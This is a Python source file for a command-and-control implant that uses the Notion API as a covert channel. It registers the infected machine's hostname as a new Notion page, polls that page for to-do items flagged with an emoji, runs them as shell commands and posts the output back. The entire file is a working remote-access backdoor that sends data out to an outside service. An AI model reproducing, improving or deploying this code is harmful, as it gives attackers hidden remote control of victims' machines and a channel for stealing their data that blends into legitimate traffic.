import os
import sys
import argparse
import requests
from getpass import getpass
import socket
from time import sleep
import subprocess

"""
Things we need to do:

Load the API key*
Start comms by making a new page*
Sleep* 
Get new blocks*
Any new commands?*
Do em*
"""
PARENT_PAGE_ID = "32b833db-af3f-4958-9960-339c2b658280"
SLEEP_INTERVAL = 10
URL_BASE = "https://api.notion.com/v1"

def create_page(headers):

    hostname = socket.gethostname()
    url = f"{URL_BASE}/pages/"
    
    body = {
        "parent": {
            "type": "page_id",
            "page_id": PARENT_PAGE_ID
        },
        "properties": {
            "title": [{
                "text": {
                    "content": hostname
                }
            }]
        }
    }
    r = requests.post(url, json=body, headers=headers)
    if r.status_code == 200:
        id = r.json()["id"]
        return id
    else:
        print(r.content)

def get_blocks(headers, page_id):
    """
    Retrieve blocks from the parent page
    """
    url = f"{URL_BASE}/blocks/{page_id}/children"
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json()["results"]
    
    return None

def new_command(blocks):
    return blocks[-1]["type"] == "to_do"

def extract_command(block):
    try:
        return block["to_do"]["text"][0]["text"]["content"]
    except:
        return None

def complete_command(headers, command_block):
    # Marking command as complete
    command_block["to_do"]["checked"] = True
    url = f"{URL_BASE}/blocks/{command_block['id']}"
    r = requests.patch(url, headers=headers, json=command_block)
    if r.status_code != 200:
        print(r.content)


def send_command_result(headers, command_block_id, output):
    url = f"{URL_BASE}/blocks/{command_block_id}/children"
    body = {
        "children": [
            {
                "object": "block",
                "type": "quote",
                "quote": {
                    "text": [
                        {
                            "type": "text", 
                            "text": {"content": output},
                            "annotations": {"code": True} 
                        }
                    ]
                }
            }
        ]
    }
    r = requests.patch(url, headers=headers, json=body)
    if r.status_code != 200:
        print(r.content)

def main():
    print("I'm sorry if this Notion is Offensive to you.")
    try:
        NOTION_API_KEY = os.environ["NOTION_API_KEY"]
    except:
        NOTION_API_KEY = getpass("Enter API Key: ")

    headers = {
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {NOTION_API_KEY}"
    }

    page_id = create_page(headers)
    print(page_id)

    # Main event loop
    while True:
        blocks = get_blocks(headers, page_id)

        if blocks:
            command_blocks = list(filter(lambda b: b["type"] == "to_do", blocks))
            new_commands = list(filter(lambda b: b["to_do"]["checked"] == False, command_blocks))
            if len(new_commands) > 0:
                for i in range(len(new_commands)):
                    command = extract_command(new_commands[i])
                    command_block = new_commands[i]
                    args = command.split(" ")
                    if "🎯" in command:
                        output = subprocess.run(args[:-1], capture_output=True)
                        if output.stderr:
                            complete_command(headers, command_block)
                            send_command_result(headers, page_id, output.stderr)
                        else:
                            complete_command(headers, command_block)
                            send_command_result(headers, command_block["id"], output.stdout)
        else:
            print("ZZZZ")
        sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    main()